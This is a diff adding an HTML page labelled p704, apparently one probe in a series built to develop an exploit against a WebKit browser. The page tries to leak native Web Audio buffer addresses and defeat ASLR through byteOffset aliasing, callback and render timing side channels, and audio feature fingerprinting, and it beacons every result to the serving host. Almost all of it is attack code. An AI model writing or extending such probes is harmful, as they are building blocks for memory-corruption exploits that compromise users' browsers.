@@ -1,0 +1,362 @@
+<!--
+  p704: Web Audio API internal buffer address leak
+
+  AudioContext allocates native audio buffers that back AudioBuffer
+  objects. These buffers live in a separate heap region. If we can
+  detect the buffer address through timing or behavioral side channels,
+  we get a heap region base that constrains the ASLR slide.
+
+  Attack angles:
+  A) AudioBuffer channel data aliasing -- createBuffer allocates
+     Float32Arrays backed by native audio memory. If getChannelData()
+     returns views into the same backing store, the offset between
+     channels reveals alignment.
+  B) ScriptProcessorNode onaudioprocess timing -- the callback fires
+     on the audio thread. Timing jitter reveals thread scheduling
+     which depends on memory layout.
+  C) AnalyserNode getFloatFrequencyData timing -- FFT computation
+     time depends on data alignment in the native buffer.
+  D) OfflineAudioContext rendering timing -- complete render of a
+     known signal; time depends on buffer allocation path.
+  E) AudioParam automation timing -- setValueAtTime / linearRampToValueAtTime
+     scheduling precision reveals internal timer resolution.
+  F) Decoding timing for different audio formats (WAV headers).
+
+  CRASH_CLASS: LOW (read-only audio API usage)
+  prior art: p702 (Performance API timing), p701 (JIT region oracle)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p704</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m),false);x.send();}catch(e){}}
+
+function main(){
+  b('P704-START:WEB-AUDIO-LEAK');
+  var results = [];
+
+  // === SECTION A: AudioBuffer channel data layout ===
+  b('A:AUDIOBUFFER-LAYOUT');
+  try {
+    if (typeof AudioContext === 'undefined' && typeof webkitAudioContext === 'undefined') {
+      b('A:NO-AUDIO-CONTEXT');
+    } else {
+      var AC = window.AudioContext || window.webkitAudioContext;
+      var ctx = new AC();
+      b('A:SAMPLE-RATE=' + ctx.sampleRate);
+      b('A:STATE=' + ctx.state);
+
+      // Create buffers of different sizes and check channel data
+      var sizes = [128, 256, 512, 1024, 4096, 16384];
+      for (var s = 0; s < sizes.length; s++) {
+        var buf = ctx.createBuffer(2, sizes[s], ctx.sampleRate);
+        var ch0 = buf.getChannelData(0);
+        var ch1 = buf.getChannelData(1);
+
+        // Fill with known pattern
+        for (var i = 0; i < sizes[s]; i++) {
+          ch0[i] = 1.0;
+          ch1[i] = -1.0;
+        }
+
+        // Check if channels share backing store (offset alias)
+        var shared = false;
+        ch0[0] = 0.5;
+        if (ch1[0] === 0.5) shared = true;
+
+        // Check byteOffset of the Float32Array views
+        b('A:SIZE=' + sizes[s] + ',CH0-OFF=' + ch0.byteOffset +
+          ',CH1-OFF=' + ch1.byteOffset + ',SHARED=' + shared);
+
+        // The byte distance between channels reveals alignment
+        if (ch0.buffer === ch1.buffer) {
+          var delta = ch1.byteOffset - ch0.byteOffset;
+          b('A:SAME-BUFFER,DELTA=' + delta);
+          results.push('A:same-buffer-delta=' + delta);
+        }
+      }
+
+      // Create many small buffers and check allocation pattern
+      var offsets = [];
+      for (var i = 0; i < 50; i++) {
+        var small = ctx.createBuffer(1, 128, ctx.sampleRate);
+        var data = small.getChannelData(0);
+        offsets.push(data.byteOffset);
+      }
+      b('A:SMALL-OFFSETS:' + offsets.slice(0, 10).join(','));
+
+      // Check if offsets are monotonically increasing (linear allocator)
+      var monotonic = true;
+      for (var i = 1; i < offsets.length; i++) {
+        if (offsets[i] <= offsets[i-1]) { monotonic = false; break; }
+      }
+      b('A:MONOTONIC=' + monotonic);
+
+      ctx.close();
+    }
+  } catch(e) {
+    b('A:ERR:' + e.message);
+  }
+
+  // === SECTION B: ScriptProcessorNode callback timing ===
+  b('B:SCRIPT-PROCESSOR-TIMING');
+  try {
+    var AC = window.AudioContext || window.webkitAudioContext;
+    if (AC) {
+      var ctx = new AC();
+      // ScriptProcessorNode is deprecated but still present in 605.1.15
+      if (ctx.createScriptProcessor) {
+        var bufferSizes = [256, 512, 1024, 2048, 4096];
+        var timingResults = [];
+
+        for (var bs = 0; bs < bufferSizes.length; bs++) {
+          try {
+            var proc = ctx.createScriptProcessor(bufferSizes[bs], 1, 1);
+            var callCount = 0;
+            var callTimes = [];
+
+            proc.onaudioprocess = function(e) {
+              callTimes.push(performance.now());
+              callCount++;
+              // Fill output to prevent silence detection
+              var out = e.outputBuffer.getChannelData(0);
+              for (var i = 0; i < out.length; i++) out[i] = 0;
+            };
+
+            proc.connect(ctx.destination);
+
+            // Pump for a short time
+            var deadline = Date.now() + 200;
+            while (Date.now() < deadline) {
+              // Busy wait to collect callbacks
+              try {
+                var x = new XMLHttpRequest();
+                x.open('GET', '/pump-audio/' + callCount, false);
+                x.send();
+              } catch(e2) {}
+            }
+
+            proc.disconnect();
+            timingResults.push(bufferSizes[bs] + ':n=' + callCount);
+
+            if (callTimes.length >= 2) {
+              var deltas = [];
+              for (var i = 1; i < callTimes.length; i++) {
+                deltas.push((callTimes[i] - callTimes[i-1]).toFixed(2));
+              }
+              b('B:BUF=' + bufferSizes[bs] + ',DELTAS=' + deltas.slice(0, 5).join(','));
+            }
+          } catch(e3) {
+            timingResults.push(bufferSizes[bs] + ':ERR');
+          }
+        }
+        b('B:TIMING:' + timingResults.join(','));
+      } else {
+        b('B:NO-SCRIPT-PROCESSOR');
+      }
+      ctx.close();
+    }
+  } catch(e) {
+    b('B:ERR:' + e.message);
+  }
+
+  // === SECTION C: AnalyserNode data extraction ===
+  b('C:ANALYSER-DATA');
+  try {
+    var AC = window.AudioContext || window.webkitAudioContext;
+    if (AC) {
+      var ctx = new AC();
+      var analyser = ctx.createAnalyser();
+      analyser.fftSize = 2048;
+
+      // Connect an oscillator
+      var osc = ctx.createOscillator();
+      osc.frequency.value = 440;
+      osc.connect(analyser);
+      osc.start();
+
+      // Collect frequency data
+      var freqData = new Float32Array(analyser.frequencyBinCount);
+      var timeData = new Float32Array(analyser.fftSize);
+
+      // Pump briefly
+      var deadline = Date.now() + 100;
+      while (Date.now() < deadline) {
+        try { var x = new XMLHttpRequest(); x.open('GET','/pump-fft',false); x.send(); } catch(e2){}
+      }
+
+      analyser.getFloatFrequencyData(freqData);
+      analyser.getFloatTimeDomainData(timeData);
+
+      // Check for non-standard values in the data
+      var nonZeroFreq = 0, nonZeroTime = 0;
+      var maxFreq = -Infinity, minFreq = Infinity;
+      for (var i = 0; i < freqData.length; i++) {
+        if (freqData[i] !== -Infinity && freqData[i] !== 0) nonZeroFreq++;
+        if (freqData[i] > maxFreq) maxFreq = freqData[i];
+        if (freqData[i] < minFreq && freqData[i] !== -Infinity) minFreq = freqData[i];
+      }
+      for (var i = 0; i < timeData.length; i++) {
+        if (timeData[i] !== 0) nonZeroTime++;
+      }
+
+      b('C:FREQ-NONZERO=' + nonZeroFreq + '/' + freqData.length);
+      b('C:TIME-NONZERO=' + nonZeroTime + '/' + timeData.length);
+      b('C:FREQ-RANGE=' + minFreq.toFixed(2) + '..' + maxFreq.toFixed(2));
+
+      // Check Float32Array buffer properties
+      b('C:FREQ-BYTEOFF=' + freqData.byteOffset + ',BYTELEN=' + freqData.byteLength);
+      b('C:TIME-BYTEOFF=' + timeData.byteOffset + ',BYTELEN=' + timeData.byteLength);
+
+      osc.stop();
+      ctx.close();
+    }
+  } catch(e) {
+    b('C:ERR:' + e.message);
+  }
+
+  // === SECTION D: OfflineAudioContext render timing ===
+  b('D:OFFLINE-RENDER-TIMING');
+  try {
+    if (typeof OfflineAudioContext !== 'undefined') {
+      // Render different buffer sizes and measure timing
+      var renderSizes = [4096, 8192, 16384, 32768, 65536];
+      var renderTimes = [];
+
+      for (var rs = 0; rs < renderSizes.length; rs++) {
+        var offline = new OfflineAudioContext(1, renderSizes[rs], 44100);
+        var osc = offline.createOscillator();
+        osc.frequency.value = 440;
+        osc.connect(offline.destination);
+        osc.start();
+
+        var t0 = performance.now();
+        // startRendering returns a promise -- we can't await synchronously
+        // but we can measure the setup time
+        var renderPromise = offline.startRendering();
+        var setupTime = performance.now() - t0;
+        renderTimes.push(renderSizes[rs] + ':' + setupTime.toFixed(3));
+      }
+      b('D:RENDER-SETUP-TIMES:' + renderTimes.join(','));
+
+      // Check if setup time scales linearly (would indicate buffer allocation)
+      if (renderTimes.length >= 3) {
+        var times = renderTimes.map(function(r) { return parseFloat(r.split(':')[1]); });
+        var ratio = times[times.length-1] / times[0];
+        b('D:SCALE-RATIO=' + ratio.toFixed(2));
+        if (ratio > 5) {
+          results.push('D:render-scales');
+        }
+      }
+    } else {
+      b('D:NO-OFFLINE-CTX');
+    }
+  } catch(e) {
+    b('D:ERR:' + e.message);
+  }
+
+  // === SECTION E: AudioParam value automation ===
+  b('E:AUDIOPARAM-AUTOMATION');
+  try {
+    var AC = window.AudioContext || window.webkitAudioContext;
+    if (AC) {
+      var ctx = new AC();
+      var gain = ctx.createGain();
+      gain.connect(ctx.destination);
+
+      // Schedule many automation events and check timing precision
+      var schedTimes = [];
+      for (var i = 0; i < 100; i++) {
+        var t = i * 0.001; // 1ms intervals
+        gain.gain.setValueAtTime(i / 100.0, t);
+        schedTimes.push(t);
+      }
+
+      // Read back the value at specific times
+      // (gain.gain.value gives current value, not scheduled)
+      b('E:CURRENT-VALUE=' + gain.gain.value);
+      b('E:DEFAULT-VALUE=' + gain.gain.defaultValue);
+      b('E:MIN-VALUE=' + gain.gain.minValue);
+      b('E:MAX-VALUE=' + gain.gain.maxValue);
+
+      // Check if cancelScheduledValues works (reveals internal list)
+      gain.gain.cancelScheduledValues(0.05);
+      b('E:AFTER-CANCEL=' + gain.gain.value);
+
+      // Enumerate AudioParam properties for non-standard extensions
+      var paramProps = Object.getOwnPropertyNames(Object.getPrototypeOf(gain.gain));
+      b('E:PARAM-PROPS:' + paramProps.join(','));
+
+      ctx.close();
+    }
+  } catch(e) {
+    b('E:ERR:' + e.message);
+  }
+
+  // === SECTION F: Audio API feature fingerprint ===
+  b('F:AUDIO-FINGERPRINT');
+  try {
+    var AC = window.AudioContext || window.webkitAudioContext;
+    if (AC) {
+      var ctx = new AC();
+      var features = [];
+
+      // Check which node types exist
+      var nodeTypes = [
+        'createOscillator', 'createGain', 'createBiquadFilter',
+        'createDelay', 'createDynamicsCompressor', 'createConvolver',
+        'createAnalyser', 'createScriptProcessor', 'createWaveShaper',
+        'createPanner', 'createStereoPanner', 'createChannelSplitter',
+        'createChannelMerger', 'createConstantSource', 'createIIRFilter',
+        'createMediaStreamSource', 'createMediaStreamDestination',
+        'createBuffer', 'createBufferSource', 'createPeriodicWave'
+      ];
+
+      for (var i = 0; i < nodeTypes.length; i++) {
+        features.push(nodeTypes[i] + ':' + (typeof ctx[nodeTypes[i]] === 'function' ? 'Y' : 'N'));
+      }
+      b('F:NODES:' + features.join(','));
+
+      // Check AudioContext properties
+      var ctxProps = Object.getOwnPropertyNames(Object.getPrototypeOf(ctx));
+      b('F:CTX-PROPS:' + ctxProps.join(','));
+
+      // Check for non-standard properties
+      var nonStandard = [];
+      for (var i = 0; i < ctxProps.length; i++) {
+        if (['createJavaScriptNode', 'createGainNode', 'createDelayNode',
+             'createPannerNode', 'decodeAudioData', 'listener',
+             'audioWorklet'].indexOf(ctxProps[i]) < 0 &&
+            ctxProps[i].indexOf('create') === 0) {
+          nonStandard.push(ctxProps[i]);
+        }
+      }
+      if (nonStandard.length > 0) {
+        b('F:NON-STANDARD:' + nonStandard.join(','));
+        results.push('F:non-standard-audio');
+      }
+
+      // AudioWorklet availability (key for advanced attacks)
+      if (ctx.audioWorklet) {
+        b('F:AUDIOWORKLET=AVAILABLE');
+        results.push('F:audioworklet');
+      } else {
+        b('F:AUDIOWORKLET=ABSENT');
+      }
+
+      ctx.close();
+    }
+  } catch(e) {
+    b('F:ERR:' + e.message);
+  }
+
+  // === RESULTS ===
+  if (results.length > 0) {
+    b('P704-RESULT:HITS=' + results.join(';'));
+  } else {
+    b('P704-RESULT:NO-LEAK-DETECTED');
+  }
+  b('P704-DONE');
+}
+
+setTimeout(main, 200);
+</script>
+</head><body style="margin:0"><pre id="log">p704: Web Audio API internal buffer address leak</pre></body></html>
